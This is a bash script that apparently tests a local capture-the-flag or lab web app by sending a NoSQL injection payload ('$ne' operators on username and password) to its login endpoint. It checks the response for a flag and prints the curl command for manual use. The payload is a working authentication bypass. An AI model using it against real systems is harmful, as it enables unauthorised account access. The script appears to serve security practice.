#!/bin/bash

# NoSQL Injection Test Script
# This script tests the NoSQL injection vulnerability from WSL

# First, get the Windows host IP
WINDOWS_IP=$(ip route show | grep -i default | awk '{ print $3}')
echo "🔍 Detected Windows IP: $WINDOWS_IP"

# Test 1: Basic connectivity
echo "🔗 Testing basic connectivity..."
curl -s "http://$WINDOWS_IP:3000/" > /dev/null
if [ $? -eq 0 ]; then
    echo "✅ Connection successful!"
else
    echo "❌ Cannot connect. Try: http://$(hostname -I | awk '{print $1}'):3000"
    echo "   Or use your Windows IP directly."
    exit 1
fi

# Test 2: NoSQL Injection Attack
echo "🎯 Launching NoSQL injection attack..."

RESPONSE=$(curl -s -X POST "http://$WINDOWS_IP:3000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}')

echo "📝 Response: $RESPONSE"

# Check if we got the flag
if echo "$RESPONSE" | grep -q "flag"; then
    echo "🎉 SUCCESS! NoSQL injection worked!"
    echo "🏴‍☠️ Flag found in response!"
else
    echo "❌ Attack failed. Response: $RESPONSE"
fi

echo ""
echo "🎯 Manual test commands:"
echo "curl -X POST 'http://$WINDOWS_IP:3000/api/auth/login' \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}'"